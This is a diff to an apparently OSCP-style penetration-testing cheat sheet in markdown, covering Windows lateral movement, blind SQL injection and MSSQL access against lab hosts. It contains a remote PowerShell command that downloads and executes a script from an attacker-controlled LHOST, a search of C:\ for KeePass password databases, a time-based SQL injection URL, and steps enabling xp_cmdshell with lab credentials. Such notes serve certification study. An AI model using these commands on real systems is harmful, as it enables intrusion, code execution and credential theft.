@@ -134,6 +134,9 @@ $cred = New-Object System.Management.Automation.PSCredential("<% tp.frontmatter[
 Invoke-Command -Computer <% tp.frontmatter["RHOST"] %> -ScriptBlock { IEX(New-Object Net.WebClient).downloadString('http://<% tp.frontmatter["LHOST"] %>/<FILE>.ps1') } -Credential $cred
 
 
+# Search For File
+Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
+
 ```
 
 
@@ -767,8 +770,6 @@ http://192.168.50.16/blindsqli.php?user=offsec' AND IF (1=1, sleep(3),'false') -
 ```
 
 
-
-
 ### mssql
 ```bash
 impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth
@@ -788,3 +789,14 @@ EXECUTE sp_configure 'xp_cmdshell', 1;
 RECONFIGURE;
 EXECUTE xp_cmdshell 'whoami';
 ```
+
+### Password hash
+```bash
+echo -n "secret" | sha256sum
+```
+
+
+### Hash Identifier
+![image](https://github.com/nuricheun/OSCP/assets/14031269/ca7ce199-47ed-4a09-bdc8-3184ea590ef5)
+
+
